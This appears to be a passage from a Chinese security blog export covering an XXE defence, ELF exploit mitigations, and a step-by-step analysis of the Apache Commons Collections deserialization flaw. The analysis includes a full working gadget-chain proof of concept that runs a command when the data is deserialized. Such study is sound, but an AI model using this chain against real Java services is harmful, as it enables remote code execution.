检测方法1、在Java项目中搜索javax.xml.parsers下的DocumentBuilderFactory和DocumentBuilder，排查是否使用了该API解析XML文档内容； 2、若使用了，则进一步排查是否禁用了不安全的操作，具体的是看setFeature()的设置是否存在绕过的可能。 0x06 防御方法正确地设置setFeature()来进行防御，在创建出新的DocumentBuilderFactory实例之后就调用： 1234567891011121314151617181920212223public static void documentBuilder(File f)&#123; DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance(); try &#123; //防御XML注入 factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true); factory.setFeature("http://xml.org/sax/features/external-general-entities", false); factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false); factory.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false); DocumentBuilder builder = factory.newDocumentBuilder(); //解析xml文档，先获取 Document doc = builder.parse(f); //通过user名字来获取dom节点 NodeList nodeList = doc.getElementsByTagName("user"); Element e = (Element)nodeList.item(0); //获取值 System.out.println("姓名："+e.getElementsByTagName("name").item(0).getFirstChild().getNodeValue()); System.out.println("性别："+e.getElementsByTagName("sex").item(0).getFirstChild().getNodeValue()); System.out.println("年龄："+e.getElementsByTagName("age").item(0).getFirstChild().getNodeValue()); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125;&#125; 再次测试之前的payload，都没有成功： 至于setFeature()的详细配置可查阅：http://xerces.apache.org/xerces2-j/features.html 0x07 参考DTD/XXE 攻击笔记分享 XML外部实体（XXE）注入详解]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>Java</tag>
        <tag>XML注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ELF安全防御机制小结]]></title>
    <url>%2F2019%2F02%2F09%2FELF%E5%AE%89%E5%85%A8%E9%98%B2%E5%BE%A1%E6%9C%BA%E5%88%B6%E5%B0%8F%E7%BB%93%2F</url>
    <content type="text"><![CDATA[这里主要介绍一下Linux下ELF文件的一些安全防御机制及其原理，其在二进制安全和Pwn上经常会碰到，至于各个类型的绕过技巧后面会补充。 NX（DEP）NX即No-eXecute（不可执行）的意思，NX（即Windows上类似的DEP）的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。 通常开启了NX后，即使有栈溢出漏洞也执行不了写在栈上的shellcode，但是可通过ROP方式来绕过NX跳转至其他地方执行。 gcc编译器默认开启了NX选项，如果需要关闭NX选项，可以给gcc编译器添加-z execstack参数。例如：gcc -z execstack -o test test.c 在Windows下，类似的概念为DEP（数据执行保护），在最新版的Visual Studio中默认开启了DEP编译选项。 原理如图： 网上找的示例图： PIE（ASLR）（1）ASLR（Address Space Layout Randomization）：地址随机化，通常用来防御return2libc攻击，有以下3种配置： ​ 0 - 表示关闭进程地址空间随机化。 ​ 1 - 表示将mmap的基址，stack和vdso页面随机化。 ​ 2 - 表示在1的基础上增加栈（heap）的随机化。 （2）PIE（Position-Independent Executables）：位置无关的可执行文件，和Windows下的ASLR（Address Space Layout Randomization)机制类似，PIE enabled表示程序开启地址随机化选、意味着程序每次运行的时候地址都会变化。主要是为了解决二进制本身地址已知的问题，可用来防御return2elf和其他已知地址读写问题。 默认情况下，PIE未开启，x86加载的基地址为0x8048000，而x64加载的基址为0x400000。 开启PIE后，elf中相对偏移不变，但加载机制每次均变化。 一般情况下NX（DEP）和PIE（ASLR）会同时工作。 PIE机制有以下三种情况： ​ 0 - 表示关闭进程地址空间随机化。 ​ 1 - 表示将mmap的基址，stack和vdso页面随机化。 ​ 2 - 表示在1的基础上增加栈（heap）的随机化。 可以防范基于Ret2libc方式的针对DEP的攻击。ASLR和DEP配合使用，能有效阻止攻击者在堆栈上运行恶意代码。 Built as PIE：位置独立的可执行区域PIE。这样使得在利用缓冲溢出和移动操作系统中存在的其他内存崩溃缺陷时采用面向返回的编程ROP（return-oriented programming）方法变得难得多。 liunx下关闭PIE的命令如下：sudo -s echo 0 &gt; /proc/sys/kernel/randomize_va_space RELRORELRO（Relocation Read Only）重定向只读，实现就是由linker指定binary的一块经过dynamic linker处理过 relocation之后的区域为只读，用来防御hijack GOT攻击。通过设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，保护库函数的调用不受攻击者重定位的影响，从而减少对GOT（Global Offset Table）攻击。 动态函数在第一次懒加载过程中，会使用到重定位表格进行符号搜索，并将搜索到的函数信息保存到重定位项中，第二次直接跳转到重定位项中。而攻击者可以修改重定位表格或重定位项来实现hijack GOT表攻击。 RELRO有Partial RELRO和FULL RELRO两个选项，如果开启FULL RELRO，意味着无法修改GOT表；如果为Partial RELRO，说明对GOT表具有写权限。在Linux下默认开启状态。 Partial RELRO：重定位表格只读，重定位项可读写； FULL RELRO：重定位表格和重定位项均为只读（但会导致符号懒加载失效，同时会带来启动时的效率下降）； 可通过ROP绕过。 FORTIFYFortify 技术是GCC在编译源码时判断程序的哪些buffer会存在可能的溢出，在buffer大小已知的情况下，GCC会把 strcpy、memcpy,、memset等函数自动替换成相应的 __strcpy_chk(dst, src, dstlen)等函数，达到防止缓冲区溢出的作用。 FORTIFY_SOURCE机制对格式化字符串有两个限制： ​ (1)包含%n的格式化字符串不能位于程序内存中的可写地址； ​ (2)当使用位置参数时，必须使用范围内的所有参数。例如要使用%4$x，则必须同时使用1、2、3。 GCC中-D_FORTIFY_SOURCE=2是默认开启的，但是只有开启O2或以上优化的时候，这个选项才会被真正激活。 如果指定-D_FORTIFY_SOURCE=1，那同样也要开启O1或以上优化，这个选项才会被真正激活。 可以使用-U_FORTIFY_SOURCE或者-D_FORTIFY_SOURCE=0来禁用。 如果开启了-D_FORTIFY_SOURCE=2，那么调用__printf_chk函数的时候会检查format string中是否存在%n，如果存在%n 而且format string是在一个可写的segment中的（不是在read-only内存段中），那么程序会报错并终止。如果是开启-D_FORTIFY_SOURCE=1，那么就不会报错。 CANARY（Stack）Stack，栈溢出检查，用Canary是否变化来检测，其中Canary found表示开启。 Canary是一种缓冲区溢出攻击缓解手段：启用栈保护后，函数开始执行的时候会先往栈里插入cookie信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败而阻止shellcode的执行。在Linux将cookie信息称为Canary。 如图： 在GCC中开启Canary有3中选项： 禁用Canary：gcc -fno-stack-protector -o test test.c 启用Canary，但只为局部变量中含有char数组的函数插入保护代码：gcc -fstack-protector -o test test.c 启用Canary，为所有函数插入保护代码：gcc -fstack-protector-all -o test test.c 如果栈中开启Canary found，那么就不能用直接用溢出的方法覆盖栈中返回地址，而且要通过改写指针与局部变量、leak canary、overwrite canary的方法来绕过。 参考Pwn基础知识笔记 软件常用安全防护手段 checksec 总结]]></content>
      <categories>
        <category>二进制基础</category>
      </categories>
      <tags>
        <tag>二进制</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Java反序列化漏洞]]></title>
    <url>%2F2019%2F02%2F06%2FJava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[在学习Java反序列化漏洞之前，建议先熟悉Java序列化和反序列化机制。 在反序列化漏洞中，Java类反序列化漏洞较PHP和Python的相比，显得稍微复杂一些。主要是要求对Java较为熟悉。下面小结一下Java反序列化漏洞的相关内容。 0x01 何为Java反序列化漏洞当开发者自定义实现Serializable、添加自己的readObject()方法时，若readObject()方法内代码逻辑存在缺陷，则可能存在Java反序列化漏洞的风险。如果此时Java服务的反序列化API允许外部用户使用，则会导致攻击者使用精心构造的payload来利用反序列化漏洞达到任意代码执行的目的。 Java反序列化中readObject()方法的作用相当于PHP反序列化中的魔术函数，使反序列化过程在一定程度上受控成为可能，是否真的可控，还需分析每个对象的readObject()方法具体是如何实现的。通常情况下，在Java的readObject()方法中很少会像CTF中PHP的反序列化漏洞题目一样直接将漏洞代码写在该方法中，这时就需要去构造反射链来进行任意代码执行。 0x02 重写readObject()示例Java反序列化漏洞的根源在于重写readObject()方法导致存在漏洞代码。 readObject()方法重写的格式如下： 1private void readObject(ObjectInputStream stream) throws IOException, ClassNotFoundException 注意，readObject()方法被定义成了private，并且是必须尝试捕获IOException和ClassNotFoundException的异常。 这里再贴另外一个简单的示例，创建一个不安全的类对象，赋值其name属性并序列化为文件保存起来，接着通过反序列化该文件获取该对象及其属性值，通过重写readObject()方法在调用默认的readObject()方法之后添加一条执行计算器的代码： 1234567891011121314151617181920212223242526272829303132333435import java.io.*;public class test &#123; public static void main(String args[]) throws Exception&#123; UnsafeClass Unsafe = new UnsafeClass(); Unsafe.name = "Mi1k7ea"; System.out.println("[*]序列化对象"); FileOutputStream fos = new FileOutputStream("object.ser"); ObjectOutputStream os = new ObjectOutputStream(fos); os.writeObject(Unsafe); os.close(); fos.close(); System.out.println("[*]反序列化文件中保存的序列化对象"); FileInputStream fis = new FileInputStream("object.ser"); ObjectInputStream ois = new ObjectInputStream(fis); UnsafeClass objectFromDisk = (UnsafeClass)ois.readObject(); System.out.println(objectFromDisk.name); ois.close(); fis.close(); &#125;&#125;class UnsafeClass implements Serializable&#123; public String name; //重写readObject()方法 private void readObject(java.io.ObjectInputStream in) throws IOException, ClassNotFoundException&#123; //执行默认的readObject()方法 in.defaultReadObject(); //执行命令 Runtime.getRuntime().exec("calc.exe"); &#125;&#125; 可以看到，在readObject()方法调用时Java的序列化机制会先寻找用户是否自定义了readObject()方法，若有则直接调用该自定义的方法而非默认的readObject()方法： 0x03 Apache Commons Collections反序列化漏洞分析Apache Commons Collections是一个扩展了Java标准库里的Collection结构的第三方基础库，包含了很多jar工具包，提供了很多强有力的数据结构类型并且实现了各种集合工具类。 org.apache.commons.collections提供一个类包来扩展和增加标准的Java的collection框架，也就是说这些扩展也属于collection的基本概念，只是功能不同罢了。Java中的collection可以理解为一组对象，collection里面的对象称为collection的对象。具象的collection为set、list、queue等等，它们是集合类型。换一种理解方式，collection是set、list、queue的抽象。 作为Apache开源项目的重要组件，Commons Collections被广泛应用于各种Java应用的开发，而正是因为在大量web应用程序中这些类的实现以及方法的调用，导致了反序列化用漏洞的普遍性和严重性。 影响版本：3.2.1及以下版本的Commons Collections包。 下面就简单地模拟该序列化漏洞产生、payload的构造及利用过程。这里示例用的commons-collections-3.2.1.jar包。 漏洞点Apache Commons Collections中有一个特殊的接口Transformer，其中有一个实现该接口的类InvokerTransformer可以通过调用Java的反射机制来调用任意函数，其源码如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758public class InvokerTransformer implements Transformer, Serializable &#123; private static final long serialVersionUID = -8653385846894047688L; private final String iMethodName; private final Class[] iParamTypes; private final Object[] iArgs; public static Transformer getInstance(String methodName) &#123; if (methodName == null) &#123; throw new IllegalArgumentException("The method to invoke must not be null"); &#125; else &#123; return new InvokerTransformer(methodName); &#125; &#125; public static Transformer getInstance(String methodName, Class[] paramTypes, Object[] args) &#123; if (methodName == null) &#123; throw new IllegalArgumentException("The method to invoke must not be null"); &#125; else if (paramTypes == null &amp;&amp; args != null || paramTypes != null &amp;&amp; args == null || paramTypes != null &amp;&amp; args != null &amp;&amp; paramTypes.length != args.length) &#123; throw new IllegalArgumentException("The parameter types must match the arguments"); &#125; else if (paramTypes != null &amp;&amp; paramTypes.length != 0) &#123; paramTypes = (Class[])((Class[])paramTypes.clone()); args = (Object[])((Object[])args.clone()); return new InvokerTransformer(methodName, paramTypes, args); &#125; else &#123; return new InvokerTransformer(methodName); &#125; &#125; private InvokerTransformer(String methodName) &#123; this.iMethodName = methodName; this.iParamTypes = null; this.iArgs = null; &#125; public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) &#123; this.iMethodName = methodName; this.iParamTypes = paramTypes; this.iArgs = args; &#125; public Object transform(Object input) &#123; if (input == null) &#123; return null; &#125; else &#123; try &#123; Class cls = input.getClass(); Method method = cls.getMethod(this.iMethodName, this.iParamTypes); return method.invoke(input, this.iArgs); &#125; catch (NoSuchMethodException var4) &#123; throw new FunctorException("InvokerTransformer: The method '" + this.iMethodName + "' on '" + input.getClass() + "' does not exist"); &#125; catch (IllegalAccessException var5) &#123; throw new FunctorException("InvokerTransformer: The method '" + this.iMethodName + "' on '" + input.getClass() + "' cannot be accessed"); &#125; catch (InvocationTargetException var6) &#123; throw new FunctorException("InvokerTransformer: The method '" + this.iMethodName + "' on '" + input.getClass() + "' threw an exception", var6); &#125; &#125; &#125;&#125; 可以看到该InvokerTransformer类是实现Transformer接口的（Transformer接口主要用于转换并返回一个给定的Object对象），且其中的transform()方法采用反射机制进行任意函数调用，这就是漏洞点所在。 这里是反射机制关键的三句代码： 123Class cls = input.getClass();Method method = cls.getMethod(this.iMethodName, this.iParamTypes);return method.invoke(input, this.iArgs); 第一句：input为Object对象，获取其对应的Class； 第二句：获取cls类中具体的方法对象； 第三句：执行input对象的method方法，返回同method一样的返回类型。 上述三句代码其实等同于下面的代码，即可以直接合并起来： 1input.getClass().getMethod(this.iMethodName, this.iParamTypes).invoke(input, this.iArgs); 下面编写代码进行弹出计算器的测试来验证该漏洞点是否能利用： 123456789public class POC_Test&#123; public static void main(String[] args) throws Exception &#123; InvokerTransformer it = new InvokerTransformer( "exec", new Class[]&#123;String.class&#125;, new Object[]&#123;"calc.exe"&#125;); it.transform(java.lang.Runtime.getRuntime()); &#125;&#125; 可以看到是可以弹出计算器的，即可以进行漏洞利用，但是有个问题，就是我们不能从外部直接传入java.lang.Runtime.getRuntime()，这时就需要我们去构造链式结构的payload来实现漏洞利用。 下面就开始构造反射链payload来实现反序列化漏洞的利用。 1、通过反射构造可序列化的恶意反射链对象一步步来，我们知道，要让Java程序执行执行命令，通常是获取到Runtime的实例，再调用它的exec()执行命令： 12Runtime runtime = Runtime.getRuntime();runtime.exec(cmd); 接着将其表示为链式结构的形式，因为底层通过反射技术获取对象调用函数都会存在一个上下文环境，使用链式结构的语句可以保证执行过程中这个上下文是一致的： 1java.lang.Runtime.getRuntime().exec(cmd) 好了，我们知道构造的反射链是这种格式，下面开始分析Commons Collections的payload的链式结构。 Commons Collections中有一个用于对象之间转换的Transformer接口，先看构造的链式结构payload中涉及到的几个实现类，只需看其构造方法和transform()方法即可。 1、ConstantTransformer类，是一个Transformer接口实现类，其构造方法和transform()方法如下，可看到transform()方法会原封不动地返回传入的Object，从而可构造外部输入的常量如Runtime.class： 1234567public ConstantTransformer(Object constantToReturn) &#123; this.iConstant = constantToReturn;&#125;public Object transform(Object input) &#123; return this.iConstant;&#125; 2、InvokerTransformer类，在漏洞点中已说明。 3、ChainedTransformer类，是一个Transformer接口实现类，其构造方法和transform()方法如下，其transform()方法用于链接多个步骤构造的transformer，其中object参数为上一次调用transform()的返回结果： 12345678910public ChainedTransformer(Transformer[] transformers) &#123; this.iTransformers = transformers;&#125;public Object transform(Object object) &#123; for(int i = 0; i &lt; this.iTransformers.length; ++i) &#123; object = this.iTransformers[i].transform(object); &#125; return object;&#125; 接着看下面这段构造的payload链式结构： 1234567Transformer[] transformers = new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer("getMethod", new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;"getRuntime", new Class[0]&#125;), new InvokerTransformer("invoke", new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null, new Object[0]&#125;), new InvokerTransformer("exec", new Class[]&#123;String.class&#125;, new Object[]&#123;"calc.exe",&#125;),&#125;;Transformer transformerChain = new ChainedTransformer(transformers); 构造过程如下： 构造一个ConstantTransformer对象，把Runtime的Class对象传进去，在transform()时，始终会返回这个对象； 构造一个InvokerTransformer对象，待调用方法名为getMethod，参数为getRuntime，在transform()时，传入第一步的结果，此时的input应该是java.lang.Runtime，但经过getClass()之后，cls为java.lang.Class，之后getMethod()只能获取java.lang.Class的方法，因此才会定义的待调用方法名为getMethod，然后其参数才是getRuntime，它得到的是getMethod这个方法的Method对象，invoke()调用这个方法，最终得到的才是getRuntime这个方法的Method对象； 构造一个InvokerTransformer对象，待调用方法名为invoke，参数为空，在transform()时，传入第二步的结果，同理，cls将会是java.lang.reflect.Method，再获取并调用它的invoke()方法，实际上是调用上面的getRuntime()拿到Runtime对象； 构造一个InvokerTransformer对象，待调用方法名为exec，参数为命令字符串，在transform()时，传入第三步的结果，获取java.lang.Runtime的exec方法并传参调用； 最后把它们组装成一个数组全部放进ChainedTransformer中，在transform()时，会将前一个元素的返回结果作为下一个的参数，刚好满足需求。 有一个问题——上面的第2、3步是不是可以简化一下，考虑用下面这种逻辑更清晰的方式来构造呢？ 1234Transformer[] trans = new Transformer[] &#123; new ConstantTransformer(Runtime.getRuntime()), new InvokerTransformer("getRuntime", new Class[0], new Object[0]), new InvokerTransformer("exec", new Class[] &#123; String.class &#125;, new Object[] &#123; cmd &#125;)&#125;; 答案是不行的。虽然单看整个链，无论是定义还是执行都是没有任何问题的，但是在后续序列化时，由于Runtime.getRuntime()得到的是一个对象，这个对象也需要参与序列化过程，而Runtime本身是没有实现Serializable接口的，所以会导致序列化失败。 构造完这条Transformer链，就等着谁来执行它的transform()了。 这里可以先直接在代码下面添加transformerChain.transform(null);语句来查看该Transformer链是否真的可以执行命令且该对象是否可以被序列化，代码示例如下： 1234567891011121314151617181920public class test &#123; public static void main(String args[]) throws Exception&#123; Transformer[] transformers = new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer("getMethod", new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;"getRuntime", new Class[0]&#125;), new InvokerTransformer("invoke", new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null, new Object[0]&#125;), new InvokerTransformer("exec", new Class[]&#123;String.class&#125;, new Object[]&#123;"calc.exe",&#125;), &#125;; Transformer transformerChain = new ChainedTransformer(transformers); //测试我们的恶意对象是否可以被序列化 ByteArrayOutputStream out = new ByteArrayOutputStream(); ObjectOutputStream objOut = new ObjectOutputStream(out); objOut.writeObject(transformerChain); //执行以下语句就可以调用起计算器 transformerChain.transform(null); &#125;&#125; 执行之后程序没报错，即该Transformer链可以进行序列化，并且在执行transformerChain.transform(null);时成功弹出计算器： 该Transformer链没有问题，下面就是找Commons Collections中哪些地方可以执行该Transformer链的transform()方法以及寻找含有自定义有漏洞的readObject()方法的类了。 2、查找自定义readObject()方法且存在漏洞代码的类如网上所说，在JDK较早的版本中存在AnnotationInvocationHandler类 ，其类对象在初始化时可以传入一个Map类型参数赋值给字段memberValues，readObject()过程中如果满足一定条件就会对memberValues中的元素进行setValue()。 但是，在较新版本的JDK中AnnotationInvocationHandler没有了setValue()方法，但是可以使用BadAttributeValueExpException类来实现。由于本地环境的JDK为较新的版本，因此就先对BadAttributeValueExpException类进行分析。 利用类1——BadAttributeValueExpException下面看下BadAttributeValueExpException类定义，可以看到定义了一个名为val的对象类型属性，且自定义了readObject()方法： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849public class BadAttributeValueExpException extends Exception &#123; /* Serial version */ private static final long serialVersionUID = -3105272988410493376L; /** * @serial A string representation of the attribute that originated this exception. * for example, the string value can be the return of &#123;@code attribute.toString()&#125; */ private Object val; /** * Constructs a BadAttributeValueExpException using the specified Object to * create the toString() value. * * @param val the inappropriate value. */ public BadAttributeValueExpException (Object val) &#123; this.val = val == null ? null : val.toString(); &#125; /** * Returns the string representing the object. */ public String toString() &#123; return "BadAttributeValueException: " + val; &#125; private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException &#123; ObjectInputStream.GetField gf = ois.readFields(); Object valObj = gf.get("val", null); if (valObj == null) &#123; val = null; &#125; else if (valObj instanceof String) &#123; val= valObj; &#125; else if (System.getSecurityManager() == null || valObj instanceof Long || valObj instanceof Integer || valObj instanceof Float || valObj instanceof Double || valObj instanceof Byte || valObj instanceof Short || valObj instanceof Boolean) &#123; val = valObj.toString(); &#125; else &#123; // the serialized object is from a version without JDK-8019292 fix val = System.identityHashCode(valObj) + "@" + valObj.getClass().getName(); &#125; &#125; &#125; 查看自定义的readObejct()方法，其中在满足System.getSecurityManager() == null时会调用 valObj.toString()，从攻击思路上看，其他的条件都是无法满足的。因此valObj.toString()就成为了突破口，此时要找到一个合适的工具在toString()方法被调用的时候会触发我们构造的恶意代码。 利用类2——AnnotationInvocationHandler前提是换个低的JDK版本，本地测试时换的JDK1.7。 先看下AnnotationInvocationHandler的类定义，定义了Class类型的type变量、Map类型的memberValues变量以及Method[]类型的memberMethods数组变量，并且重写了readObject()方法： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768class AnnotationInvocationHandler implements InvocationHandler, Serializable &#123; private final Class type; private final Map&lt;String, Object&gt; memberValues; private transient volatile Method[] memberMethods = null; AnnotationInvocationHandler(Class var1, Map&lt;String, Object&gt; var2) &#123; this.type = var1; this.memberValues = var2; &#125; public Object invoke(Object var1, Method var2, Object[] var3) &#123; String var4 = var2.getName(); Class[] var5 = var2.getParameterTypes(); if (var4.equals("equals") &amp;&amp; var5.length == 1 &amp;&amp; var5[0] == Object.class) &#123; return this.equalsImpl(var3[0]); &#125; else &#123; assert var5.length == 0; if (var4.equals("toString")) &#123; return this.toStringImpl(); &#125; else if (var4.equals("hashCode")) &#123; return this.hashCodeImpl(); &#125; else if (var4.equals("annotationType")) &#123; return this.type; &#125; else &#123; Object var6 = this.memberValues.get(var4); if (var6 == null) &#123; throw new IncompleteAnnotationException(this.type, var4); &#125; else if (var6 instanceof ExceptionProxy) &#123; throw ((ExceptionProxy)var6).generateException(); &#125; else &#123; if (var6.getClass().isArray() &amp;&amp; Array.getLength(var6) != 0) &#123; var6 = this.cloneArray(var6); &#125; return var6; &#125; &#125; &#125; &#125; ... private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException &#123; var1.defaultReadObject(); AnnotationType var2 = null; try &#123; var2 = AnnotationType.getInstance(this.type); &#125; catch (IllegalArgumentException var9) &#123; return; &#125; Map var3 = var2.memberTypes(); Iterator var4 = this.memberValues.entrySet().iterator(); while(var4.hasNext()) &#123; Entry var5 = (Entry)var4.next(); String var6 = (String)var5.getKey(); Class var7 = (Class)var3.get(var6); if (var7 != null) &#123; Object var8 = var5.getValue(); if (!var7.isInstance(var8) &amp;&amp; !(var8 instanceof ExceptionProxy)) &#123; var5.setValue((new AnnotationTypeMismatchExceptionProxy(var8.getClass() + "[" + var8 + "]")).setMember((Method)var2.members().get(var6))); &#125; &#125; &#125; &#125;&#125; 可以看到，在readObject()函数中，在其遍历memberValues.entrySet()时，会用键名在memberTypes中尝试获取一个Class（这里为var7变量），并判断它是否为null，这是触发反序列化RCE所需要满足的条件。 接下来是网上很少提到过的一个结论：首先，memberTypes是AnnotationType的一个字段，里面存储着Annotation接口声明的方法信息 （键名为方法名，值为方法返回类型） 。因此，我们在获取AnnotationInvocationHandler实例时，需要传入一个方法个数大于0的Annotation子类 （一般来说，若方法个数大于0，都会包含一个名为value的方法） ，并且原始Map中必须存在任意以这些方法名为键名的元素，且元素值不是该方法返回类型的实例，才能顺利进入setValue()的流程。 因此我们只需要： 寻找一个Map类，该类的特点是其中的Entry在SetValue的时候会执行额外的程序； 将这个Map类作为参数构建一个AnnotationInvocationHandler对象，并序列化； 3、查找可通过toString()触发transform()方法的合适的类利用类1——BadAttributeValueExpException从BadAttributeValueExpException类的readObejct()方法知道，关注点在valObj.toString()中，那么现在就需要找到一个合适的类在调用toString()方法时触发transform()方法来执行我们构造的反射链。 LazyMap——调用get()方法触发transform()方法 LazyMap是Commons-collections 3.1提供的一个工具类，是Map的一个实现，主要的内容是利用工厂设计模式，在用户get一个不存在的key的时候执行一个方法来生成Key值，当且仅当get行为存在的时候Value才会被生成。其定义代码如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950public class LazyMap extends AbstractMapDecorator implements Map, Serializable &#123; private static final long serialVersionUID = 7990956402564206740L; protected final Transformer factory; public static Map decorate(Map map, Factory factory) &#123; return new LazyMap(map, factory); &#125; public static Map decorate(Map map, Transformer factory) &#123; return new LazyMap(map, factory); &#125; protected LazyMap(Map map, Factory factory) &#123; super(map); if (factory == null) &#123; throw new IllegalArgumentException("Factory must not be null"); &#125; else &#123; this.factory = FactoryTransformer.getInstance(factory); &#125; &#125; protected LazyMap(Map map, Transformer factory) &#123; super(map); if (factory == null) &#123; throw new IllegalArgumentException("Factory must not be null"); &#125; else &#123; this.factory = factory; &#125; &#125; private void writeObject(ObjectOutputStream out) throws IOException &#123; out.defaultWriteObject(); out.writeObject(this.map); &#125; private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException &#123; in.defaultReadObject(); this.map = (Map)in.readObject(); &#125; public Object get(Object key) &#123; if (!this.map.containsKey(key)) &#123; Object value = this.factory.transform(key); this.map.put(key, value); return value; &#125; else &#123; return this.map.get(key); &#125; &#125;&#125; LazyMap测试代码，在get一个不存在的key的时候执行一个方法来生成Key值，下面的代码运行结果会调用transform()输出”Mi1k7ea”： 12345678910public class Test&#123; public static void main(String[] args) throws Exception &#123; Map targetMap = LazyMap.decorate(new HashMap(), new Transformer() &#123; public Object transform(Object input) &#123; return "Mi1k7ea"; &#125; &#125;); System.out.println(targetMap.get("hhhhhhhh")); &#125;&#125; TiedMapEntry——调用toString()方法触发getValue()方法（即LazyMap.get()） TiedMapEntry也存在于Commons-collections 3.1，该类主要的作用是将一个Map绑定到Map.Entry下，形成一个映射。 主要代码如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172public class TiedMapEntry implements Entry, KeyValue, Serializable &#123; private static final long serialVersionUID = -8453869361373831205L; private final Map map; private final Object key; public TiedMapEntry(Map map, Object key) &#123; this.map = map; this.key = key; &#125; public Object getKey() &#123; return this.key; &#125; public Object getValue() &#123; return this.map.get(this.key); &#125; public Object setValue(Object value) &#123; if (value == this) &#123; throw new IllegalArgumentException("Cannot set value to this map entry"); &#125; else &#123; return this.map.put(this.key, value); &#125; &#125; public boolean equals(Object obj) &#123; if (obj == this) &#123; return true; &#125; else if (!(obj instanceof Entry)) &#123; return false; &#125; else &#123; boolean var10000; label43: &#123; label29: &#123; Entry other = (Entry)obj; Object value = this.getValue(); if (this.key == null) &#123; if (other.getKey() != null) &#123; break label29; &#125; &#125; else if (!this.key.equals(other.getKey())) &#123; break label29; &#125; if (value == null) &#123; if (other.getValue() == null) &#123; break label43; &#125; &#125; else if (value.equals(other.getValue())) &#123; break label43; &#125; &#125; var10000 = false; return var10000; &#125; var10000 = true; return var10000; &#125; &#125; public int hashCode() &#123; Object value = this.getValue(); return (this.getKey() == null ? 0 : this.getKey().hashCode()) ^ (value == null ? 0 : value.hashCode()); &#125; public String toString() &#123; return this.getKey() + "=" + this.getValue(); &#125;&#125; 分析下这个类，首先是toString()中调用了getValue()，而getValue()中实际是map.get(key)，如此一来就构建起了整个调用链接了。 利用类2——AnnotationInvocationHandler从AnnotationInvocationHandler类的readObejct()方法知道，关注点在memberValue.setValue()中，那么现在就需要找到一个合适的类在调用setValue()方法时触发transform()方法来执行我们构造的反射链。 TransformedMap TransformedMap是Commons-collections 3.1提供的一个工具类，用来包装一个Map对象，并且在该对象的Entry的Key或者Value进行改变的时候，对该Key和Value进行Transformer提供的转换操作，从而满足了我们对理想型媒介的需求，即能在调用setValue()方法时触发transform()方法来执行我们构造的反射链： 12345678910111213141516171819202122232425262728public class TransformedMap extends AbstractInputCheckedMapDecorator implements Serializable &#123; private static final long serialVersionUID = 7023152376788900464L; protected final Transformer keyTransformer; protected final Transformer valueTransformer; public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) &#123; return new TransformedMap(map, keyTransformer, valueTransformer); &#125; ... protected TransformedMap(Map map, Transformer keyTransformer, Transformer valueTransformer) &#123; super(map); this.keyTransformer = keyTransformer; this.valueTransformer = valueTransformer; &#125; protected Object transformKey(Object object) &#123; return this.keyTransformer == null ? object : this.keyTransformer.transform(object); &#125; protected Object transformValue(Object object) &#123; return this.valueTransformer == null ? object : this.valueTransformer.transform(object); &#125; protected Object checkSetValue(Object value) &#123; return this.valueTransformer.transform(value); &#125; ...&#125; 构造过程小结利用类1——BadAttributeValueExpException这里将上述分析的调用过程做个图清晰地列出来，相信应该很明确该反射链执行的过程了： 最终构造的代码 1234567891011121314151617181920212223242526272829303132333435363738public class test &#123; public static void main(String args[]) throws Exception&#123; Transformer[] transformers = new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer("getMethod", new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;"getRuntime", new Class[0]&#125;), new InvokerTransformer("invoke", new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null, new Object[0]&#125;), new InvokerTransformer("exec", new Class[]&#123;String.class&#125;, new Object[]&#123;"calc.exe",&#125;), &#125;; Transformer transformerChain = new ChainedTransformer(transformers); final Map lazyMap = LazyMap.decorate(new HashMap(), transformerChain); TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo"); BadAttributeValueExpException val = new BadAttributeValueExpException(null); //利用反射的方式来向对象传参 Field valfield = val.getClass().getDeclaredField("val"); valfield.setAccessible(true); valfield.set(val, entry); test t = new test(); t.deserialize(t.serialize(val)); &#125; public byte[] serialize(final Object obj) throws IOException &#123; ByteArrayOutputStream out = new ByteArrayOutputStream(); ObjectOutputStream objOut = new ObjectOutputStream(out); objOut.writeObject(obj); return out.toByteArray(); &#125; public Object deserialize(final byte[] serialized) throws IOException, ClassNotFoundException &#123; ByteArrayInputStream in = new ByteArrayInputStream(serialized); ObjectInputStream objIn = new ObjectInputStream(in); return objIn.readObject(); &#125;&#125; 运行结果，弹出计算器： 